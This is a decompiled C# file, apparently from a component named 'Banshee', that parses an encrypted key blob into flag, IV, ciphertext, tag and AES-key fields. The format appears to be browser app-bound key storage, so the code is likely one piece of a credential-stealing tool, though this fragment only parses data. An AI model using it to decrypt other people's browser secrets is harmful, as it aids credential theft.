﻿using System;
using System.IO;

namespace Banshee.Helper
{
	// Token: 0x020000BE RID: 190
	public static class ParseKeyBlob
	{
		// Token: 0x06000255 RID: 597 RVA: 0x00012168 File Offset: 0x00012168
		public static BlobParsedData Parse(byte[] blobData)
		{
			BlobParsedData result;
			using (MemoryStream memoryStream = new MemoryStream(blobData))
			{
				using (BinaryReader binaryReader = new BinaryReader(memoryStream))
				{
					uint count = binaryReader.ReadUInt32();
					binaryReader.ReadBytes((int)count);
					int num = (int)binaryReader.ReadUInt32();
					long position = memoryStream.Position;
					byte[] iv = null;
					byte[] ciphertext = null;
					byte[] tag = null;
					if (num == 32)
					{
						byte[] encryptedAesKey = binaryReader.ReadBytes(32);
						result = new BlobParsedData
						{
							Flag = 32,
							Iv = iv,
							Ciphertext = ciphertext,
							Tag = tag,
							EncryptedAesKey = encryptedAesKey
						};
					}
					else
					{
						byte b = binaryReader.ReadByte();
						if (b - 1 > 1)
						{
							if (b != 3 && b != 35)
							{
								throw new Exception();
							}
							byte[] encryptedAesKey = binaryReader.ReadBytes(32);
							iv = binaryReader.ReadBytes(12);
							ciphertext = binaryReader.ReadBytes(32);
							tag = binaryReader.ReadBytes(16);
							result = new BlobParsedData
							{
								Flag = b,
								Iv = iv,
								Ciphertext = ciphertext,
								Tag = tag,
								EncryptedAesKey = encryptedAesKey
							};
						}
						else
						{
							iv = binaryReader.ReadBytes(12);
							ciphertext = binaryReader.ReadBytes(32);
							tag = binaryReader.ReadBytes(16);
							result = new BlobParsedData
							{
								Flag = b,
								Iv = iv,
								Ciphertext = ciphertext,
								Tag = tag,
								EncryptedAesKey = null
							};
						}
					}
				}
			}
			return result;
		}
	}
}
